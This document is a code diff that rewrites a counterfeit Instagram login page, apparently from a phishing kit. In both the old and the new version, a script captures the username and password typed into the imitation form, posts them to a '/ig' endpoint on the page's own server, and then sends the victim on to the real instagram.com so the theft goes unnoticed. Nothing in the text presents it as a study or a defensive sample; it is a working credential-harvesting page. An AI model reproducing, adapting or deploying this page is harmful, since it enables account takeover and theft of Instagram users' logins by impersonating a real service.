@@ -1,134 +1,168 @@
-
-<html>
+<!DOCTYPE html>
+<html lang="en">
 
 <head>
-    <link href="/assets/css/ig.css" rel="stylesheet" />
-    <title>Instagram</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+
+  <link href="/assets/css/ig.css" rel="stylesheet" />
 </head>
 
 <body>
-    <span id="root">
-      <section class="section-all">
-        <!-- 1-Role Main -->
-        <main class="main" role="main">
-          <div class="wrapper">
-            <article class="article">
-              <div class="content">
-                <div class="login-box">
-                  <div class="header">
-                    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
-                  </div><!-- Header end -->
-                  <div class="form-wrap">
-                    <form class="form" id="igform">
-  
-                      <div class="input-box">
-                        <input type="text" id="name" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" value="" required>
-                      </div>  
-  
-                      <div class="input-box">
-                        <input type="password" name="password" id="password" placeholder="Password" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
-                      </div>  
-  
-                      <span class="button-box">
-                        <button class="btn" type="submit" name="submit">Log in</button>
-                      </span>  
-  
-                      <a class="forgot" href="">Forgot password?</a>
-                    </form>
-                  </div> <!-- Form-wrap end -->
-                </div> <!-- Login-box end -->
-  
-                <div class="login-box">
-                  <p class="text">Don't have an account?<a href="#">Sign up</a></p>
-                </div> <!-- Signup-box end -->
-  
-                <div class="app">
-                  <p>Get the app.</p>
-                  <div class="app-img">
-                    <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
-                      <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
-                    </a>
-                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
-                      <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
-                    </a>  
-                  </div>  <!-- App-img end-->
-                </div> <!-- App end -->
-              </div> <!-- Content end -->
-            </article>
-          </div> <!-- Wrapper end -->
-        </main>
-  
-        <!-- 2-Role Footer -->
-        <footer class="footer" role="contentinfo">
-          <div class="footer-container">
-  
-            <nav class="footer-nav" role="navigation">
-              <ul>
-                <li><a href="">About Us</a></li>
-                <li><a href="">Support</a></li>
-                <li><a href="">Blog</a></li>
-                <li><a href="">Press</a></li>
-                <li><a href="">Api</a></li>
-                <li><a href="">Jobs</a></li>
-                <li><a href="">Privacy</a></li>
-                <li><a href="">Terms</a></li>
-                <li><a href="">Directory</a></li>
-                <li>
-                  <span class="language">Language
-                    <select name="language" class="select" onchange="la(this.value)">
-                      <option value="#">English</option>
-                      <option value="http://ru-instafollow.bitballoon.com">Russian</option>
-                    </select>
-                  </span>
-                </li>
-              </ul>
-            </nav>
-  
-            <span class="footer-logo">&copy; 2018 Instagram</span>
-          </div> <!-- Footer container end -->
-        </footer>
-        
-      </section>
-    </span> <!-- Root -->
-  
-    <!-- Select Link -->
-    <script type="text/javascript">
-      function la(src) {
-        window.location=src;
+
+  <div id="content-container">
+
+    <!--Phone's pictures section-->
+    <section class="phones">
+      <img src="/assets/img/phones.png" alt="pictures on phone" class="phone-image">
+      <div class="display-phone">
+        <img class="picture" src="/assets/img/photo-1.png" alt="#">
+        <img class="picture" src="/assets/img/photo-2.png" alt="#">
+        <img class="picture" src="/assets/img/photo-3.png" alt="#">
+        <img class="picture" src="/assets/img/photo-4.png" alt="#">
+        <img class="picture" src="/assets/img/photo-5.png" alt="#">
+      </div>
+    </section>
+
+    <!--User's log in section-->
+    <section class="user">
+
+      <div class="login-container">
+
+        <!--Instagram Logo-->
+        <div class="instagram-logo-box">
+          <img class="instagram-logo" src="/assets/img/instagram-logo.png">
+        </div>
+
+        <!--Form Login-->
+        <form id="login-post">
+          <div class="inputs-container">
+            <input type="text" name="name" placeholder="Phone number, username or email">
+          </div>
+          <div class="inputs-container">
+            <input type="password" name="password" placeholder="Password">
+          </div>
+          <button class="login-button">Log In</button>
+
+          <div class="or-container">
+            <div class="line"></div>
+            <div class="or">OR</div>
+            <div class="line"></div>
+          </div>
+
+          <!--Facebook login-->
+          <div class="facebook-container">
+            <a class="facebook-login" href="#" target="_blank"><img class="facebook-logo"
+                src="/assets/img/facebook-logo.png">Log in
+              with Facebook</a>
+          </div>
+        </form>
+
+        <!--Password recovery-->
+        <a class="password-forgot" href="#" target="_blank">Forgot password?</a>
+      </div>
+
+      <!--Sign up-->
+      <div class="signup-container">
+        <p>Don't have an account? <a class="signup" href="#" target="_blank">Sign up</a></p>
+      </div>
+
+      <!--App's download-->
+      <div class="get-container">
+        <p>Get the app.</p>
+        <div class="download-container">
+          <a class="download-appstore" href="#" target="_blank"><img class="appstore"
+              src="/assets/img/applestore-logo.png"></a>
+          <a class="download-googleplay" href="#" target="_blank"><img class="googleplay"
+              src="/assets/img/googleplay-logo.png"></a>
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <footer class="page-footer">
+
+    <div class="links-container">
+      <ul class="links-list">
+        <li>
+          <a class="link" href="#" target="_blank">ABOUT</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">PRESS</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">API</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">JOBS</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">PRIVACY</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">TERMS</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">LOCATIONS</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">TOP ACCOUNTS</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">HASHTAGS</a>
+        </li>
+        <li>
+          <a class="link" href="#" target="_blank">LANGUAGE</a>
+        </li>
+      </ul>
+    </div>
+
+    <div class="footer-span-container">
+      <span class="footer-span">
+        © 2020 INSTAGRAM FROM FACEBOOK
+      </span>
+    </div>
+  </footer>
+
+  <script type="text/javascript">
+    function la(src) {
+      window.location=src;
+    }
+    
+    const loginPost = document.getElementById("login-post");
+
+    loginPost.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const password = document.querySelector("input[name=password]");
+      const name = document.querySelector("input[name=name]");
+
+      const data = {
+        name: name.value,
+        password: password.value
       }
-      
-      const igform = document.getElementById("igform");
 
-      igform.addEventListener("submit", async (e) => {
-        e.preventDefault();
-        const password = document.getElementById("password");
-        const name = document.getElementById("name");
-        const data = {
-          name: name.value,
-          password: password.value
+      const res = await fetch(`/ig`, {
+        method: "POST",
+        body: JSON.stringify(data),
+        headers: {
+          "Content-Type": "application/json"
         }
+      })
 
-        const res = await fetch(`/ig`, {
-          method: "POST",
-          body: JSON.stringify(data),
-          headers: {
-            "Content-Type": "application/json"
-          }
-        })
+      const dataRes = await res.json();
 
-        const dataRes = await res.json();
+      console.log("dataRes", dataRes)
+      console.log("DATA", data)
 
-        console.log("dataRes", dataRes)
-        console.log("DATA", data)
+      if(dataRes.message === "OK") {
+        return location.href = "https://www.instagram.com"
+      }
 
-        if(dataRes.message === "OK") {
-          return location.href = "https://www.instagram.com"
-        }
+    });
+  </script>
+</body>
 
-      });
-
-
-    </script>
-  </body>
-
-  </html>
+</html>
